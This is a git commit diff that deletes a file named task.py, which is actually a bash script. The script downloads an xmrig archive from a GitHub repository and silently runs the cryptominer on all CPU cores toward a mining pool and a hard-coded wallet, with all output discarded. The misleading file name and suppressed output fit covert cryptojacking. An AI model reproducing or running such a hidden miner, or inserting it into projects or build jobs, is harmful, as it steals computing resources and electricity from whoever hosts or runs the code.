9129d1b0ea71f402ecb48241d9b6b8add121f912
jhonaves <janekasparo@gmail.com>
2025-03-02 00:09:09 +0700

    Update and rename task.py to prutes

--- task.py
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-A=sg.salvium.herominers.com:1230
-B=SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv
-C=cs
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
